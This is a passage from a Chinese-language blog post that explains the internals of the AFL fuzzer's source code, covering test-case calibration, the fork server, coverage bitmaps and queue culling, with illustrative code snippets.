sessions时，我们不希望一遍又一遍地自动调整超时时间，以防止超时值因随机波动而增长</p><ul><li>如果resuming_fuzz为0，则直接return</li><li>如果in_place_resume为1，则<code>fn = alloc_printf(&quot;%s/fuzzer_stats&quot;, out_dir);</code>，否则<code>fn = alloc_printf(&quot;%s/../fuzzer_stats&quot;, in_dir);</code></li><li>以只读方式打开fd，读取内容到tmp[4096]里，并在里面搜索”exec_timeout      : “，如果搜索不到就直接返回，如果搜索到了，就读取这个timeout的数值，如果大于4就设置为exec_tmout的值。<ul><li>EXP_ST u32 exec_tmout = EXEC_TIMEOUT; /* Configurable exec timeout (ms)   */</li></ul></li><li>timeout_given = 3;<ul><li>timeout_given,             /* Specific timeout given?          */</li></ul></li></ul><h4 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h4><p>这个函数其实就是识别参数里面有没有<code>@@</code>，如果有就替换为<code>out_dir/.cur_input</code>，如果没有就返回</p><h4 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file"></a>setup_stdio_file</h4><p>如果out_file为NULL，如果没有使用-f，就删除原本的<code>out_dir/.cur_input</code>，创建一个新的<code>out_dir/.cur_input</code>，保存其文件描述符在out_fd中</p><h4 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary"></a>check_binary</h4><p>check指定路径处要执行的程序是否存在，且它不能是一个shell script</p><h4 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h4><p>执行所有的测试用例，以检查是否按预期工作</p><ul><li>读取环境变量AFL_SKIP_CRASHES到skip_crashes，设置cal_failures为0</li><li>遍历queue<ul><li>打开q-&gt;fname，并读取到分配的内存use_mem里</li><li>res = calibrate_case(argv, q, use_mem, 0, 1);<ul><li>校准测试用例，见下文</li></ul></li><li>如果stop_soon被置为1，就直接return</li><li>如果res的结果为crash_mode或者FAULT_NOBITS<ul><li>打印<code>SAYF(&quot;len = %u, map size = %u, exec speed = %llu us\n&quot;, q-&gt;len, q-&gt;bitmap_size, q-&gt;exec_us);</code></li></ul></li><li>依据res的结果查看是哪种错误并进行判断。一共有以下几种错误类型<ul><li>FAULT_NONE<ul><li>如果q是头结点，即第一个测试用例，则<code>check_map_coverage</code>，用以评估map coverage<ul><li>计数trace_bits发现的路径数，如果小于100，就直接返回</li><li>在trace_bits的数组后半段，如果有值就直接返回。</li><li>抛出警告<code>WARNF(&quot;Recompile binary with newer version of afl to improve coverage!&quot;)</code></li></ul></li><li>如果是crash_mode，则抛出异常，<code>FATAL(&quot;Test case &#39;%s&#39; does *NOT* crash&quot;, fn);</code>，该文件不崩溃</li></ul></li><li>FAULT_TMOUT<ul><li>如果指定了-t参数，则timeout_given值为2<ul><li>抛出警告<code>WARNF(&quot;Test case results in a timeout (skipping)&quot;);</code>，并设置q的cal_failed为CAL_CHANCES，cal_failures计数器加一。</li></ul></li></ul></li><li>FAULT_CRASH<ul><li>如果没有指定mem_limit，则可能抛出建议增加内存的建议</li><li>但不管指定了还是没有，都会抛出异常<code>FATAL(&quot;Test case &#39;%s&#39; results in a crash&quot;, fn);</code></li></ul></li><li>FAULT_ERROR<ul><li>抛出异常<code>Unable to execute target application</code></li></ul></li><li>FAULT_NOINST<ul><li>这个样例运行没有出现任何路径信息，抛出异常<code>No instrumentation detected</code></li></ul></li><li>FAULT_NOBITS<ul><li>如果这个样例有出现路径信息，但是没有任何新路径，抛出警告<code>WARNF(&quot;No new instrumentation output, test case may be useless.&quot;)</code>，认为这是无用路径。useless_at_start计数器加一</li></ul></li></ul></li><li>如果这个样例q的var_behavior为真，则代表它多次运行，同样的输入条件下，却出现不同的覆盖信息。<ul><li>抛出警告<code>WARNF(&quot;Instrumentation output varies across runs.&quot;);</code>，代表这个样例的路径输出可变</li></ul></li><li>然后读取下一个queue，继续测试，直到结束。     <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> &#123;</span><br><span class="line"><span class="comment">/* 00 */</span> FAULT_NONE,</span><br><span class="line"><span class="comment">/* 01 */</span> FAULT_TMOUT,</span><br><span class="line"><span class="comment">/* 02 */</span> FAULT_CRASH,</span><br><span class="line"><span class="comment">/* 03 */</span> FAULT_ERROR,</span><br><span class="line"><span class="comment">/* 04 */</span> FAULT_NOINST,</span><br><span class="line"><span class="comment">/* 05 */</span> FAULT_NOBITS &#125;;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="u8-calibrate-case-char-argv-struct-queue-entry-q-u8-use-mem-u32-handicap-u8-from-queue"><a href="#u8-calibrate-case-char-argv-struct-queue-entry-q-u8-use-mem-u32-handicap-u8-from-queue" class="headerlink" title="u8 calibrate_case(char **argv, struct queue_entry *q, u8 *use_mem, u32 handicap, u8 from_queue)"></a>u8 calibrate_case(char **argv, struct queue_entry *q, u8 *use_mem, u32 handicap, u8 from_queue)</h4><p>这个函数评估input文件夹下的case，来发现这些testcase的行为是否异常；以及在发现新的路径时，用以评估这个新发现的testcase的行为是否是可变（这里的可变是指多次执行这个case，发现的路径不同）等等</p><ul><li>这个函数的参数为<code>char **argv, struct queue_entry *q, u8 *use_mem, u32 handicap, u8 from_queue</code></li><li>创建first_trace[MAP_SIZE]</li><li>如果q-&gt;exec_cksum为0，代表这是这个case第一次运行，即来自input文件夹下，所以将first_run置为1。</li><li>保存原有的stage_cur、stage_max、stage_name</li><li>设置use_tmout为exec_tmout,如果from_queue是0或者resuming_fuzz被置为1，即代表不来自于queue中或者在resuming sessions的时候，则use_tmout的值被设置的更大。</li><li>q-&gt;cal_failed++</li><li>设置stage_name为”calibration”,以及根据是否fast_cal为1，来设置stage_max的值为3还是CAL_CYCLES(默认为8)，含义是每个新测试用例（以及显示出可变行为的测试用例）的校准周期数，也就是说这个stage要执行几次的意思。</li><li>如果当前不是以dumb mode运行，且no_forkserver（禁用forkserver）为0，且forksrv_pid为0，则init_forkserver(argv)启动fork server，见后文。</li><li>如果<strong>这个queue不是来自input文件夹，而是评估新case</strong>，则此时<code>q-&gt;exec_cksum</code>不为空，拷贝trace_bits到first_trace里，然后计算<code>has_new_bits</code>的值，赋值给new_bits。</li><li>开始执行calibration stage，共执行stage_max轮<ul><li>如果<strong>这个queue不是来自input文件夹，而是评估新case</strong>，且第一轮calibration stage执行结束时，刷新一次展示界面<code>show_stats</code>，用来展示这次执行的结果，此后不再展示。</li><li>write_to_testcase(use_mem, q-&gt;len)<ul><li>将从<code>q-&gt;fname</code>中读取的内容写入到<code>.cur_input</code>中</li></ul></li><li><code>u8 run_target(argv, use_tmout)</code>,结果保存在fault中</li><li>如果这是<code>calibration stage</code>第一次运行，且不在dumb_mode，且共享内存里没有任何路径（即没有任何byte被置位），设置fault为<code>FAULT_NOINST</code>,然后goto abort_calibration。<ul><li>计算共享内存里有多少字节被置位了,通过count_bytes函数<ul><li><code>u32 count_bytes(u8 *mem)</code></li></ul></li></ul></li><li>计算<code>hash32(trace_bits, MAP_SIZE, HASH_CONST)</code>的结果，其值为一个32位uint值，保存到cksum中</li><li>如果<code>q-&gt;exec_cksum</code>不等于cksum，即代表<strong>这是第一次运行，或者在相同的参数下，每次执行，cksum却不同，是一个路径可变的queue</strong><ul><li><code>hnb = has_new_bits(virgin_bits)</code></li><li>如果hnb大于new_bits，设置new_bits的值为hnb</li><li>如果<code>q-&gt;exec_cksum</code>不等于0，即代表这是判断是否是可变queue<ul><li>i从0到MAP_SIZE遍历，如果first_trace[i]不等于trace_bits[i]，<strong>代表发现了可变queue</strong>，且var_bytes为空，则将该字节设置为1，并将stage_max设置为<code>CAL_CYCLES_LONG</code>，即需要执行40次。</li><li>将var_detected设置为1</li></ul></li><li>否则，即q-&gt;exec_cksum等于0，即代表这是第一次执行这个queue<ul><li>设置q-&gt;exec_cksum的值为之前计算出来的本次执行的cksum</li><li>拷贝trace_bits到first_trace中。</li></ul></li></ul></li></ul></li><li>保存所有轮次总的执行时间，加到total_cal_us里，总的执行轮次，加到total_cal_cycles里</li><li>计算出一些统计信息，包括<ul><li>计算出单次执行时间的平均值保存到q-&gt;exec_us里</li><li>将最后一次执行所覆盖到的路径数保存到q-&gt;bitmap_size里</li><li><code>q-&gt;handicap = handicap;</code></li><li><code>q-&gt;cal_failed = 0;</code></li><li>total_bitmap_size里加上这个queue所覆盖到的路径数</li><li>total_bitmap_entries++</li><li>update_bitmap_score(struct queue_entry *q)</li></ul></li><li>如果fault为<code>FAULT_NONE</code>，且该queue是第一次执行，且不属于dumb_mode，而且new_bits为0，代表在这个样例所有轮次的执行里，都没有发现任何新路径和出现异常，设置fault为<code>FAULT_NOBITS</code></li><li>如果new_bits为2，且<code>q-&gt;has_new_cov</code>为0，设置其值为1，并将queued_with_cov加一，代表有一个queue发现了新路径。</li><li>如果这个queue是可变路径，即var_detected为1，则计算var_bytes里被置位的tuple个数，保存到var_byte_count里，代表这些tuple具有可变的行为。</li><li>将这个queue标记为一个variable<ul><li><code>mark_as_variable(struct queue_entry *q)</code><ul><li>创建符号链接<code>out_dir/queue/.state/variable_behavior/fname</code></li><li>设置queue的var_behavior为1</li></ul></li><li>计数variable behavior的计数器<code>queued_variable</code>的值加一</li></ul></li><li>恢复之前的stage值</li><li>如果不是第一次运行这个queue，展示<code>show_stats</code></li><li>返回fault的值</li></ul><h4 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h4><ul><li><p>建立管道st_pipe和ctl_pipe，在父子进程之间，是通过管道进行通信，一个用于传递状态，另一个用于传递命令。</p><ul><li>在继续往下读之前需要仔细阅读这篇文章</li><li><a href="https://zhuanlan.zhihu.com/p/58489873" target="_blank" rel="noopener">Linux 的进程间通信：管道</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-07-22-145348.jpg" alt=""></li></ul></li><li><p>fork出一个子进程，fork函数执行完毕后，如果创建新进程成功，则出现两个进程，一个是子进程，一个是父进程。在子进程中，fork函数返回0，在父进程中，fork返回新创建子进程的进程ID。我们可以通过fork返回的值来判断当前进程是子进程还是父进程。</p><ul><li>forksrv_pid = fork()</li></ul></li><li><p>子进程和父进程都会向下执行，我们通过pid来使它们执行不同的代码<code>if(!forksrv_pid)</code></p><ul><li>以下都是子进程要执行的代码<ul><li>在继续向下读之前，需要仔细阅读这篇文章<ul><li><a href="https://www.cnblogs.com/GODYCA/archive/2013/01/05/2846197.html" target="_blank" rel="noopener">进程间通信管道进阶篇：linux下dup/dup2函数的用法</a><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">假设进程A拥有一个已打开的文件描述符fd3，它的状态如下</span><br><span class="line">进程A的文件描述符表(before dup2)</span><br><span class="line">------------</span><br><span class="line">fd0 <span class="number">0</span>   | p0</span><br><span class="line">------------</span><br><span class="line">fd1 <span class="number">1</span>   | p1 -------------&gt; 文件表<span class="number">1</span> ---------&gt; vnode1</span><br><span class="line">------------</span><br><span class="line">fd2 <span class="number">2</span>   | p2</span><br><span class="line">------------</span><br><span class="line">fd3 <span class="number">3</span>   | p3 -------------&gt; 文件表<span class="number">2</span> ---------&gt; vnode2</span><br><span class="line">------------</span><br><span class="line">... ...</span><br><span class="line">... ...</span><br><span class="line">------------</span><br><span class="line"></span><br><span class="line">经下面调用：</span><br><span class="line">n_fd = dup2(fd3, STDOUT_FILENO);后进程状态如下：</span><br><span class="line"></span><br><span class="line">进程A的文件描述符表(after dup2)</span><br><span class="line">------------</span><br><span class="line">fd0 <span class="number">0</span>   | p0</span><br><span class="line">------------</span><br><span class="line">n_fd <span class="number">1</span>  | p1 ------------</span><br><span class="line">------------               \</span><br><span class="line">fd2 <span class="number">2</span>   | p2                  \</span><br><span class="line">------------                 _\|</span><br><span class="line">fd3 <span class="number">3</span>   | p3 -------------&gt; 文件表<span class="number">2</span> ---------&gt; vnode2</span><br><span class="line"></span><br><span class="line">在学习dup2时总是碰到“重定向”一词，上图完成的就是一个“从标准输出到文件的重定向”，经过dup2后进程A的任何目标为STDOUT_FILENO的I/O操作如<span class="built_in">printf</span>等，其数据都将流入fd3所对应的文件中。下面是一个例子程序：</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TESTSTR <span class="meta-string">"Hello dup2\n"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>     fd3;</span><br><span class="line"></span><br><span class="line">        fd3 = <span class="built_in">open</span>(<span class="string">"testdup2.dat"</span>, <span class="number">0666</span>);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"open error\n"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dup2(fd3, STDOUT_FILENO) &lt; <span class="number">0</span>) &#123;       </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"err in dup2\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(TESTSTR);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">其结果就是你在testdup2.dat中看到<span class="string">"Hello dup2"</span>。</span><br></pre></td></tr></table></figure></li></ul></li><li>重定向文件描述符1和2到dev_null_fd，如果指定了out_file，则文件描述符0重定向到dev_null_fd，否则重定向到out_fd。<ul><li><code>dup2(dev_null_fd, 1);</code></li><li><code>dup2(dev_null_fd, 2);</code></li></ul></li><li>重定向FORKSRV_FD到ctl_pipe[0],重定向FORKSRV_FD + 1到st_pipe[1]<ul><li>子进程只能读取命令</li><li>子进程只能发送(“写出”)状态</li></ul></li><li>关闭子进程里的一些文件描述符<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(out_dir_fd);</span><br><span class="line"><span class="built_in">close</span>(dev_null_fd);</span><br><span class="line"><span class="built_in">close</span>(dev_urandom_fd);</span><br><span class="line"><span class="built_in">close</span>(fileno(plot_file));</span><br></pre></td></tr></table></figure></li><li>读取环境变量LD_BIND_LAZY，如果没有设置，则设置环境变量LD_BIND_NOW为1</li><li>设置环境变量ASAN_OPTIONS为<code>&quot;abort_on_error=1:&quot; &quot;detect_leaks=0:&quot; &quot;symbolize=0:&quot; &quot;allocator_may_return_null=1&quot;</code>，同理设置MSAN_OPTIONS</li><li><code>execv(target_path, argv)</code>带参数执行target,这个函数除非出错不然不会返回。<ul><li>execv会替换掉原有的进程空间为target_path代表的程序，所以相当于后续就是去执行target_path，这个程序结束的话，子进程就结束。</li><li><strong>而在这里非常特殊，第一个target会进入<code>__afl_maybe_log</code>里的<code>__afl_fork_wait_loop</code>，并充当fork server，在整个Fuzz的过程中，它都不会结束，每次要Fuzz一次target，都会从这个fork server fork出来一个子进程去fuzz。</strong></li></ul></li><li>使用一个独特的bitmaps EXEC_FAIL_SIG(0xfee1dead)写入trace_bits，来告诉父进程执行失败，并结束子进程。</li></ul></li></ul></li><li><p>以下都是父进程要执行的代码</p><ul><li>关闭不需要的endpoints  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭不是需要的endpoints</span></span><br><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];<span class="comment">//父进程只能发送("写出")命令</span></span><br><span class="line">fsrv_st_fd = st_pipe[<span class="number">0</span>];<span class="comment">//父进程只能读取状态</span></span><br></pre></td></tr></table></figure></li><li>等待fork server启动，但是不能等太久。（所以在调试时要注意这个…）<ul><li>从管道里读取4个字节到status里，如果读取成功，则代表fork server成功启动，就结束这个函数并返回。</li><li>如果超时，就抛出异常。</li></ul></li></ul></li><li><p>后续是一些子进程启动失败的异常处理逻辑，暂时不叙。</p></li></ul><h4 id="has-new-bits-u8-virgin-map"><a href="#has-new-bits-u8-virgin-map" class="headerlink" title="has_new_bits(u8 *virgin_map)"></a>has_new_bits(u8 *virgin_map)</h4><ul><li>检查有没有新路径或者某个路径的执行次数有所不同。</li><li>初始化current和virgin为trace_bits和virgin_map的u64首元素地址，设置ret的值为0</li><li>8个字节一组，每次从trace_bits，也就是共享内存里取出8个字节<ul><li>如果current不为0，且<code>current &amp; virgin</code>不为0，即代表current发现了新路径或者某条路径的执行次数和之前有所不同<ul><li>如果ret当前小于2<ul><li>取current的首字节地址为cur，virgin的首字节地址为vir</li><li>i的范围是0-7，比较<code>cur[i] &amp;&amp; vir[i] == 0xff</code>，如果有一个为真，则设置ret为2<ul><li>这代表发现了之前没有出现过的tuple</li><li><strong>注意==的优先级比&amp;&amp;要高，所以先判断vir[i]是否是0xff，即之前从未被覆盖到，然后再和cur[i]进行逻辑与</strong></li></ul></li><li>否则设置ret为1<ul><li>这代表仅仅只是改变了某个tuple的hit-count</li></ul></li></ul></li><li><code>*virgin &amp;= ~*current</code></li></ul></li><li>current和virgin移动到下一组8个字节，直到MAPSIZE全被遍历完。</li></ul></li><li>如果传入给has_new_bits的参数<code>virgin_map</code>是<code>virgin_bits</code>,且ret不为0，就设置bitmap_changed为1<ul><li>virgin_bits保存还没有被Fuzz覆盖到的byte，其初始值每位全被置位1,然后每次按字节置位。</li></ul></li><li>返回ret的值。</li></ul><h4 id="u32-count-bytes-u8-mem"><a href="#u32-count-bytes-u8-mem" class="headerlink" title="u32 count_bytes(u8 *mem)"></a>u32 count_bytes(u8 *mem)</h4><ul><li>初始化计数器ret的值为0，循环读取mem里的值，每次读取4个字节到u32变量v中</li><li>如果v为0，则代表这四个字节都是0，直接跳过，进入下一次循环</li><li>如果v不为0，则依次计算<code>v &amp; FF(0),v &amp; FF(1),v &amp; FF(2),v&amp;FF(3)</code>的结果，如果不为0，则计数器ret加一。<ul><li>#define FF(_b)  (0xff &lt;&lt; ((_b) &lt;&lt; 3))<ul><li><code>(_b) &lt;&lt; 3)</code>即<code>_b * 8</code></li><li>即<code>0x000000ff</code>左移<code>(_b * 8)</code>位</li><li>最终结果可以是<code>0x000000ff</code>,<code>0x0000ff00</code>,<code>0x00ff0000</code>,<code>0xff000000</code>其中之一</li></ul></li></ul></li></ul><h4 id="u8-run-target-char-argv-u32-timeout"><a href="#u8-run-target-char-argv-u32-timeout" class="headerlink" title="u8 run_target(char **argv, u32 timeout)"></a>u8 run_target(char **argv, u32 timeout)</h4><ul><li>先清空trace_bits[MAP_SIZE]，将其全置为0，也就是清空共享内存。</li><li>如果dumb_mode等于1，且no_forkserver，则直接fork出一个子进程，然后让子进程execv去执行target，如果execv执行失败，则向trace_bits写入EXEC_FAIL_SIG</li><li>否则，就向控制管道写入<code>prev_timed_out</code>的值，命令Fork server开始fork出一个子进程进行fuzz，然后从状态管道读取fork server返回的fork出的子进程的ID到<code>child_pid</code></li><li>无论实际执行的是上面两种的哪一种，在执行target期间，都设置计数器为timeout，如果超时，就杀死正在执行的子进程，并设置child_timed_out为1;</li><li>计算target执行时间exec_ms，并将total_execs这个执行次数计数器加一。</li><li>等待target执行结束，如果是dumb_mode，target执行结束的状态码将直接保存到status中，如果不是dumb_mode，则从状态管道中读取target执行结束的状态码。</li><li>classify_counts((u64 *) trace_bits)<ul><li>具体地，target是将每个分支的执行次数用1个byte来储存，而fuzzer则进一步把这个执行次数归入到buckets中，举个例子，如果某分支执行了1次，那么落入第2个bucket，其计数byte仍为1；如果某分支执行了4次，那么落入第5个bucket，其计数byte将变为8，等等。</li><li>这样处理之后，对分支执行次数就会有一个简单的归类。例如，如果对某个测试用例处理时，分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。当然，这样的简单分类肯定不能区分所有的情况，不过在某种程度上，处理了一些因为循环次数的微小区别，而误判为不同执行结果的情况.</li></ul></li><li>设置prev_timed_out的值为child_timed_out。</li><li>接着依据status的值，向调用者返回结果。<ul><li><code>WIFSIGNALED(status)</code>若为异常结束子进程返回的状态，则为真<ul><li><code>WTERMSIG(status)</code>取得子进程因信号而中止的信号代码<ul><li>如果child_timed_out为1，且状态码为<code>SIGKILL</code>，则返回<code>FAULT_TMOUT</code></li><li>否则返回<code>FAULT_CRASH</code></li></ul></li></ul></li><li>如果是dumb_mode，且trace_bits为EXEC_FAIL_SIG，就返回<code>FAULT_ERROR</code></li><li>如果<code>timeout</code>小于等于<code>exec_tmout</code>，且<code>slowest_exec_ms</code>小于<code>exec_ms</code>，设置<code>slowest_exec_ms</code>等于<code>exec_ms</code></li><li>返回<code>FAULT_NONE</code></li></ul></li></ul><h4 id="classify-counts-u64-mem"><a href="#classify-counts-u64-mem" class="headerlink" title="classify_counts(u64 *mem)"></a>classify_counts(u64 *mem)</h4><ul><li>8个字节一组去循环读入，直到遍历完整个mem<ul><li>每次取两个字节<code>u16 *mem16 = (u16 *) mem</code></li><li>i从0到3，计算<code>mem16[i]</code>的值，在<code>count_class_lookup16[mem16[i]]</code>里找到对应的取值，并赋值给<code>mem16[i]</code></li></ul></li></ul><h4 id="update-bitmap-score-struct-queue-entry-q"><a href="#update-bitmap-score-struct-queue-entry-q" class="headerlink" title="update_bitmap_score(struct queue_entry *q)"></a>update_bitmap_score(struct queue_entry *q)</h4><p>每当我们发现一个新的路径，都会调用这个函数来判断其是不是更加地favorable，这个favorable的意思是说是否包含最小的路径集合来遍历到所有bitmap中的位，我们专注于这些集合而忽略其他的。</p><ul><li>首先计算出这个case的fav_factor，计算方法是<code>q-&gt;exec_us * q-&gt;len</code>即执行时间和样例大小的乘积，以这两个指标来衡量权重。</li><li>遍历trace_bits数组，如果该字节的值不为0，则代表这是已经被覆盖到的path<ul><li>然后检查对应于这个path的top_rated是否存在<ul><li><code>static struct queue_entry *top_rated[MAP_SIZE];                /* Top entries for bitmap bytes     */</code></li><li>如果存在，就比较<code>fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len</code>，即比较执行时间和样例大小的乘积，哪个更小。<ul><li>如果<code>top_rated[i]</code>的更小，则代表<code>top_rated[i]</code>的更优，不做任何处理，继续遍历下一个path。</li><li>如果q更小，就将<code>top_rated[i]</code>原先对应的queue entry的tc_ref字段减一，并将其trace_mini字段置为空。</li><li><code>u8 *trace_mini;                     /* Trace bytes, if kept             */</code></li><li><code>u32 tc_ref;                         /* Trace bytes ref count            */</code></li></ul></li><li>然后设置<code>top_rated[i]</code>为q，即当前case，然后将其tc_ref的值加一</li><li>如果<code>q-&gt;trace_mini</code>为空，则将trace_bits经过minimize_bits压缩，然后存到trace_mini字段里</li><li>设置score_changed为1.</li></ul></li></ul></li></ul><h4 id="void-minimize-bits-u8-dst-u8-src"><a href="#void-minimize-bits-u8-dst-u8-src" class="headerlink" title="void minimize_bits(u8 *dst, u8 *src)"></a>void minimize_bits(u8 *dst, u8 *src)</h4><p>将trace_bits压缩为较小的位图。<br>简单的理解就是把原本是包括了是否覆盖到和覆盖了多少次的byte，压缩成是否覆盖到的bit。<br>在看这个函数和下一个函数cull_queue之前，建议把<a href="https://blog.csdn.net/lxlmycsdnfree/article/details/78926359" target="_blank" rel="noopener">经典算法系列之(一) - BitMap [数据的压缩存储]</a>读完。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">minimize_bits</span><span class="params">(u8 *dst, u8 *src)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    u32 i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; MAP_SIZE) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(src++)) dst[i &gt;&gt; <span class="number">3</span>] |= <span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>);</span><br><span class="line">        i++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然dst是一个bitmap，但是实际上在这里我们还是用一个byte数组来操作它，所以就首先得做byte-&gt;bit的映射，比如说将src的前0-7个字节映射到dst的第一个字节(0-7位)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0&gt;&gt;3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 1&gt;&gt;3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 2&gt;&gt;3</span><br><span class="line">0</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; 7&gt;&gt;3</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 8&gt;&gt;3</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>然后如果src里该字节的值不为0，i此时就代表这个字节的index索引，其与<code>0000 0111</code>相与，最终的结果都只在0-7之间，这样我们就可以知道这个index在0-7之间对应的具体的bit是哪一个，最后通过或运算将该位置位。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0&amp;7</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 1&amp;7</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; 2&amp;7</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; 3&amp;7</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; 4&amp;7</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; 5&amp;7</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; 6&amp;7</span><br><span class="line">6</span><br><span class="line">&gt;&gt;&gt; 7&amp;7</span><br><span class="line">7</span><br><span class="line">&gt;&gt;&gt; 8&amp;7</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt; 9&amp;7</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h4 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h4><p>精简队列</p><ul><li>如果score_changed为0，即top_rated没有变化，或者dumb_mode,就直接返回</li><li>设置score_changed的值为0</li><li>创建u8 temp_v数组，大小为<code>MAP_SIZE除8</code>，并将其初始值设置为0xff，其每位如果为1就代表还没有被覆盖到，如果为0就代表以及被覆盖到了。</li><li>设置queued_favored为0，pending_favored为0</li><li>开始遍历queue队列，设置其favored的值都为0</li><li>将i从0到MAP_SIZE迭代，这个迭代其实就是筛选出一组queue entry，它们就能够覆盖到所有现在已经覆盖到的路径，而且这个case集合里的case要更小更快，这并不是最优算法，只能算是贪婪算法。<ul><li>这又是个不好懂的位运算，<code>temp_v[i &gt;&gt; 3] &amp; (1 &lt;&lt; (i &amp; 